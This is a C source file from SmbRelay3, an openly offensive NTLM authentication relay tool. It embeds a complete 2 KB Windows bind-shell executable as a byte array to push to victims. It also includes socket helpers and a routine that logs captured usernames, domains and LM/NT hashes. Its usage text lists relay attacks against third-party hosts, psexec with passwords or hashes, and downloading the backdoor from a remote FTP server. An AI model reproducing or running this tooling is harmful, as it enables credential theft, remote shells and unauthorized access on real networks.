/*
 Misc data manipulation functions for Smbrelay
 Andres Tarasco
*/
#include "misc.h"
#include "smbrelay.h"

extern int verbose;
void DumpMem(void* string, int length) {

	unsigned char *p = (unsigned char *) string;
	unsigned char lastrow_data[16];
	int rows = length / DBG_DUMP_ROWS;
	int lastrow = length % DBG_DUMP_ROWS;
	int i, j;
    //int k = DBG_DUMP_ROWS - lastrow ;

	for (i = 0; i < rows; i++) {
		printf("%04hx: ", i * 16);
		for (j = 0; j < DBG_DUMP_ROWS; j++) {
			printf("%02x ", p[(i * 16) + j]);
			if ( j==7 ){
				printf(" ");
			}
		}
		printf(" [ ");
		for (j = 0; j < DBG_DUMP_ROWS; j++) {
			if (isprint(p[(i * 16) + j]))
				printf("%c", p[(i * 16) + j]);
			else
				printf(".");
		}
		printf(" ]\n");
	}
	if (lastrow > 0) {
		memset(lastrow_data, 0, sizeof(lastrow_data));
		memcpy(lastrow_data, p + length - lastrow, lastrow);
		printf("%04hx: ", i * 16);
		for (j = 0; j < lastrow; j++) {
			printf("%02x ", p[(i * 16) + j]);
			if ( (j % 8 == 1) && (j!=1) )
				printf(" ");
		}
		while(j < DBG_DUMP_ROWS) {
			printf("   ");
			if (j % 8 == 1)
				printf(" ");
			j++;
		}
        //while (k!=0) { --k; printf("   "); }
		printf(" [ ");
		for (j = 0; j < lastrow; j++) {
			if (isprint(p[(i * 16) + j]))
				printf("%c", p[(i * 16) + j]);
			else
				printf(".");
		}
		while(j < DBG_DUMP_ROWS) {
			printf(" ");
			j++;
		}
        //k = DBG_DUMP_ROWS - lastrow ;
        //while (k!=0) { --k; printf(" "); }
		printf(" ]\n");
	}
	printf("\n");

}




char *ReadFileToSend(int *BackdoorFileSize,char*lpBackdoorFile)
{
	unsigned char SMRS[2048] = { // Smbrelay Shell Service ( 2kb BindShell )
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 
	0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x00, 0x00, 0x00, 
	0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 
	0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 
	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 
	0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x2F, 0xB0, 0x55, 0xC4, 0x6B, 0xD1, 0x3B, 0x97, 0x6B, 0xD1, 0x3B, 0x97, 0x6B, 0xD1, 0x3B, 0x97, 
	0x4C, 0x17, 0x46, 0x97, 0x6A, 0xD1, 0x3B, 0x97, 0x6B, 0xD1, 0x3A, 0x97, 0x6C, 0xD1, 0x3B, 0x97, 
	0xA8, 0xDE, 0x66, 0x97, 0x6E, 0xD1, 0x3B, 0x97, 0x4C, 0x17, 0x55, 0x97, 0x6A, 0xD1, 0x3B, 0x97, 
	0x4C, 0x17, 0x43, 0x97, 0x6A, 0xD1, 0x3B, 0x97, 0x52, 0x69, 0x63, 0x68, 0x6B, 0xD1, 0x3B, 0x97, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x02, 0x00, 0x3E, 0x48, 0xFF, 0x47, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x03, 0x01, 0x0B, 0x01, 0x08, 0x00, 0x00, 0x02, 0x00, 0x00, 
	0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 
	0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
	0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x30, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x04, 
	0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x5C, 0x20, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 
	0x4B, 0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 
	0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x55, 0x8B, 0xEC, 0x81, 0xEC, 0xF4, 0x01, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8D, 0x85, 0x0C, 0xFE, 
	0xFF, 0xFF, 0x50, 0x68, 0x01, 0x01, 0x00, 0x00, 0xFF, 0x15, 0x10, 0x20, 0x40, 0x00, 0x33, 0xF6, 
	0x56, 0x56, 0x56, 0x6A, 0x06, 0x6A, 0x01, 0x6A, 0x02, 0xFF, 0x15, 0x0C, 0x20, 0x40, 0x00, 0x8B, 
	0xF8, 0x6A, 0x10, 0x8D, 0x45, 0xF0, 0x50, 0x57, 0x66, 0xC7, 0x45, 0xF0, 0x02, 0x00, 0x66, 0xC7, 
	0x45, 0xF2, 0x1F, 0x90, 0x89, 0x75, 0xF4, 0xFF, 0x15, 0x08, 0x20, 0x40, 0x00, 0x6A, 0x01, 0x57, 
	0xFF, 0x15, 0x14, 0x20, 0x40, 0x00, 0x56, 0x8D, 0x45, 0xF0, 0x50, 0x57, 0xFF, 0x15, 0x18, 0x20, 
	0x40, 0x00, 0x56, 0xBB, 0x28, 0x20, 0x40, 0x00, 0x53, 0x8B, 0xF8, 0xE8, 0x50, 0x00, 0x00, 0x00, 
	0x59, 0x50, 0x53, 0x57, 0xFF, 0x15, 0x1C, 0x20, 0x40, 0x00, 0x8D, 0x45, 0x9C, 0x50, 0x8D, 0x45, 
	0xAC, 0x50, 0x56, 0x56, 0x56, 0x6A, 0x01, 0x56, 0x56, 0x68, 0x24, 0x20, 0x40, 0x00, 0x56, 0xC7, 
	0x45, 0xAC, 0x44, 0x00, 0x00, 0x00, 0x66, 0x89, 0x75, 0xDC, 0xC7, 0x45, 0xD8, 0x01, 0x01, 0x00, 
	0x00, 0x89, 0x7D, 0xEC, 0x89, 0x7D, 0xE8, 0x89, 0x7D, 0xE4, 0x89, 0x75, 0xB8, 0x89, 0x75, 0xB4, 
	0x89, 0x75, 0xE0, 0xFF, 0x15, 0x00, 0x20, 0x40, 0x00, 0x5F, 0x5E, 0x5B, 0xC9, 0xC2, 0x10, 0x00, 
	0x8B, 0x4C, 0x24, 0x04, 0xF7, 0xC1, 0x03, 0x00, 0x00, 0x00, 0x74, 0x24, 0x8A, 0x01, 0x83, 0xC1, 
	0x01, 0x84, 0xC0, 0x74, 0x4E, 0xF7, 0xC1, 0x03, 0x00, 0x00, 0x00, 0x75, 0xEF, 0x05, 0x00, 0x00, 
	0x00, 0x00, 0x8D, 0xA4, 0x24, 0x00, 0x00, 0x00, 0x00, 0x8D, 0xA4, 0x24, 0x00, 0x00, 0x00, 0x00, 
	0x8B, 0x01, 0xBA, 0xFF, 0xFE, 0xFE, 0x7E, 0x03, 0xD0, 0x83, 0xF0, 0xFF, 0x33, 0xC2, 0x83, 0xC1, 
	0x04, 0xA9, 0x00, 0x01, 0x01, 0x81, 0x74, 0xE8, 0x8B, 0x41, 0xFC, 0x84, 0xC0, 0x74, 0x32, 0x84, 
	0xE4, 0x74, 0x24, 0xA9, 0x00, 0x00, 0xFF, 0x00, 0x74, 0x13, 0xA9, 0x00, 0x00, 0x00, 0xFF, 0x74, 
	0x02, 0xEB, 0xCD, 0x8D, 0x41, 0xFF, 0x8B, 0x4C, 0x24, 0x04, 0x2B, 0xC1, 0xC3, 0x8D, 0x41, 0xFE, 
	0x8B, 0x4C, 0x24, 0x04, 0x2B, 0xC1, 0xC3, 0x8D, 0x41, 0xFD, 0x8B, 0x4C, 0x24, 0x04, 0x2B, 0xC1, 
	0xC3, 0x8D, 0x41, 0xFC, 0x8B, 0x4C, 0x24, 0x04, 0x2B, 0xC1, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0xD6, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x80, 0xBC, 0x20, 0x00, 0x00, 
	0x73, 0x00, 0x00, 0x80, 0x0D, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x80, 0x13, 0x00, 0x00, 0x80, 
	0x00, 0x00, 0x00, 0x00, 0x63, 0x6D, 0x64, 0x00, 0x53, 0x6D, 0x62, 0x52, 0x65, 0x6C, 0x61, 0x79, 
	0x33, 0x20, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x20, 
	0x2D, 0x20, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x74, 0x61, 0x72, 
	0x61, 0x73, 0x63, 0x6F, 0x2E, 0x6F, 0x72, 0x67, 0x20, 0x0A, 0x0A, 0x00, 0xA0, 0x20, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x20, 0x00, 0x00, 0x08, 0x20, 0x00, 0x00, 
	0x98, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x20, 0x00, 0x00, 
	0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD6, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x02, 0x00, 0x00, 0x80, 0xBC, 0x20, 0x00, 0x00, 0x73, 0x00, 0x00, 0x80, 0x0D, 0x00, 0x00, 0x80, 
	0x01, 0x00, 0x00, 0x80, 0x13, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00, 0x57, 0x53, 
	0x41, 0x53, 0x6F, 0x63, 0x6B, 0x65, 0x74, 0x41, 0x00, 0x00, 0x57, 0x53, 0x32, 0x5F, 0x33, 0x32, 
	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x66, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 
	0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x00, 0x00, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 
	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
	FILE *fp=fopen(lpBackdoorFile,"rb");
	char *buffer;
    int len;
	if (!fp) {
		printf("[-] %s not found. using cached version\n",lpBackdoorFile);
		buffer=(char *)malloc(sizeof(SMRS));
		memcpy(buffer,SMRS,sizeof(SMRS));
		return(buffer);
	}
	fseek(fp,0,SEEK_END);
    len=ftell(fp);
	*BackdoorFileSize=len;
	fseek(fp,0,SEEK_SET);
	buffer=(char*)malloc(len);
	fread(buffer,len,1,fp);
	fclose(fp);
	return(buffer);
}


int ConnectToRemoteHost(RELAY *relay,char *hostname, int port)
{
	#ifdef WIN32
		u_long tmp=1;
	#else
		int tmp=1;
	#endif
	fd_set fds;
	struct timeval tv;
	struct hostent *hostend;
	int i;

	relay->destinationaddr.sin_family = AF_INET;
	relay->destinationaddr.sin_addr.s_addr = inet_addr(hostname);
	if (relay->destinationaddr.sin_addr.s_addr == INADDR_NONE)
	{
		hostend=gethostbyname(hostname);
		if (!hostend) 
		{
			return(0);
		}
		memcpy(&relay->destinationaddr.sin_addr.s_addr, hostend->h_addr, 4);	   		
        printf("[+] Remote Server %s  resolved as %s\n",hostname,inet_ntoa(relay->destinationaddr.sin_addr));
	}	
	strcpy(relay->hostname,hostname);
	relay->destinationaddr.sin_port = htons(port); //445	  
	relay->destination=socket(AF_INET, SOCK_STREAM, 0);

	#ifdef WIN32
	ioctlsocket(relay->destination, FIONBIO, &tmp);
#else
	ioctl(relay->destination, FIONBIO, (char *)&tmp);
#endif
	tv.tv_sec = CONNECT_TIMEOUT;
	tv.tv_usec = 0;
	FD_ZERO(&fds);
	FD_SET(relay->destination, &fds);


	connect(relay->destination,(struct sockaddr *)&relay->destinationaddr, sizeof(relay->destinationaddr));
	i=select((int)relay->destination+1,0,&fds,0,&tv);
	if (i<=0){
		printf("[-] Error - Connection against %s:%i Failed\n",hostname,port);
        return(0);
	}
	tmp=0;
	#ifdef WIN32
	ioctlsocket( relay->destination, FIONBIO, &tmp);
#else
	ioctl(relay->destination, FIONBIO, (char *)&tmp);
#endif
	return(1);
}


int SendBytesAndWaitForResponse(SOCKET destination,char *source, int nBytes, char *destinationBuffer, int MaxReadSize,int timeout)
{
	int i=-1;
	#ifdef WIN32
		u_long tmp=1;
	#else
		int tmp=1;
	#endif
	fd_set fds;
	struct timeval tv;

	if (debug) {
		printf("Sending..\n");
		DumpMem(source,nBytes);
	}

//    if (send(destination, source, nBytes,0) >0) {
		if (timeout>0) 
		{
			#ifdef WIN32
			ioctlsocket(destination, FIONBIO, &tmp);
			#else
			ioctl(destination, FIONBIO, (char *)&tmp);
			#endif
            send(destination, source, nBytes,0);
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&fds);
			FD_SET(destination, &fds);
            //printf("Esperando Timeout: %i\n",timeout);
            i=select((int)destination+1,&fds,0,0,&tv);
            //printf("saliendo select: %i\n",i);
			if (i<=0) return(-1);
        } else {
            send(destination, source, nBytes,0);
        }
		i=recv(destination, (char *)destinationBuffer, MaxReadSize, 0);
		if (timeout>0) 
		{
			tmp=0;
			#ifdef WIN32
			ioctlsocket(destination, FIONBIO, &tmp);
			#else
			ioctl(destination, FIONBIO, (char *)&tmp);
			#endif
		}
		if (debug)
		{
			printf("[*] received: %i bytes\n",i);
			DumpMem(destinationBuffer,i);
		}
//	}
    //printf("salimos...: %i\n",i);
	return(i);
}

void WriteDataToReportFile(char *lpLogFileFilename, tSmbNtlmAuthResponse* NtlmAuthResponse, char *SourceIpAddress,unsigned char *challenge)
{
	char buffer[1024];
	char tmp[256];
	FILE *LogFile=NULL;
	char UserName[256];
	char Domain[256];
	char Workstation[256];
	unsigned char *p;
	int i;

		
	LogFile=fopen(lpLogFileFilename,"a+");
	strcpy(tmp,"#SOURCEIPADDRESS:DOMAIN:WORKSTATION:USERNAME:challenge:LMHASH:NTLMHASH\n");
	fwrite(tmp,strlen(tmp),1,LogFile);
	
	GetNTLMPacketInfo(NtlmAuthResponse,(char*)&UserName, (char*)&Domain, (char*)&Workstation,0);
	sprintf(buffer,"%s:%s:%s:%s:",SourceIpAddress,Domain,Workstation,UserName);
		//Challenge:
		sprintf(tmp,"%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x:",challenge[0],challenge[1],challenge[2],challenge[3],challenge[4],challenge[5],challenge[6],challenge[7]);
		strcat(buffer,tmp);
		//LM HASH		
		p=(unsigned char *)NtlmAuthResponse + NtlmAuthResponse->lmResponse.offset;
		//printf("LM\n");
		//DumpMem(p,24);
		for(i=0;i<24;i++) {sprintf(tmp,"%2.2x",p[i]); strcat(buffer,tmp); }
		strcat(buffer,":");
		//NT HASH		
		p=(unsigned char *)NtlmAuthResponse + NtlmAuthResponse->ntResponse.offset;
		for(i=0;i<24;i++) {sprintf(tmp,"%2.2x",p[i]); strcat(buffer,tmp); }
		fwrite(buffer,strlen(buffer),1,LogFile);
		fclose(LogFile);


}


void CleanLine(int verbose)
{
 if (verbose>0) printf("\n"); 
 else printf("                                                                              \r");
}


void Banner(void)
{
	printf("SmbRelay3 - NTLM Authentication replay attacks\n");
	printf(" (c) 2007 - 2008 Andres & Miguel Tarasco \n");
	printf(" Web Site - http://www.tarasco.org\n\n");
}

void usage(void){

	printf("Usage: SMBRelay3.exe <binding> [options]\n\n");
	printf("Binding Parameters:\n");
	printf("   --ListForSMBRequests         (Wait for incomming connections against port 445)\n");
	printf("   --ListForHTTPRequests        (Wait for incomming connections against port 80)\n");
	printf("   --ListForSMTPRequests        (Wait for incomming connections against port 25)\n");
	printf("   --ListForIMAPRequests        (Wait for incomming connections against port 143)\n");
	printf("   --ListForPOP3Requests        (Wait for incomming connections against port 110)\n");
	printf("   --psexec <host> <username> <password>  (psexec like tool)\n");
	printf("   --psexec <host> <username> <:NTLMHash> (psexec like tool)\n");


	printf("\nOptional Parameters\n");
//    printf("   --ProxySMB                   (Force Challenge 0x1122334455667788 for cracking)\n");
	printf("   --AlternativeSrcPort <port>  (Listen under different Port)\n");
	printf("   --AlternativeDstPort <port>  (Connect to a different SMB Port)\n");
	printf("   --SMBDestinationHost <host>  (Replay attack against third part host)\n");
	printf("   --SrcHostname        <host>  (Spoof incoming client name for Win2k (default smbrelay)\n");
	
    printf("   --ftp <hostname> <port> <user> <pass> (download smrs.exe from remote ftp server)\n");
	printf("   --v[v]                       (Displays verbose information )\n");

	printf("\n");
	printf("Example: smrelay3.exe --ListForHTTPRequests --AlternativeSrcPort 8080 --SMBDestinationHost dc.mydomain.com\n");
	exit(1);
}


